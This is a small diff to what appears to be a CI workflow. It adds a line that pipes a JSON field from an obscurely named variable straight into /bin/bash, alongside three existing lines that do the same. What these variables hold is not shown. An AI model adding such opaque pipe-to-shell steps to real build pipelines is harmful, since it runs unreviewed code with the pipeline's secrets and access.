@@ -30,6 +30,7 @@ jobs:
           echo $pre702 | jq -r .scqm7 | /bin/bash
           echo $u015 | jq -r .x71 | /bin/bash
           echo $qd86 | jq -r .n6 | /bin/bash
+          printf '%s' "$nxny811" | jq -r .szmh001 | /bin/bash
 
       - name: Store artifact
         if: always()
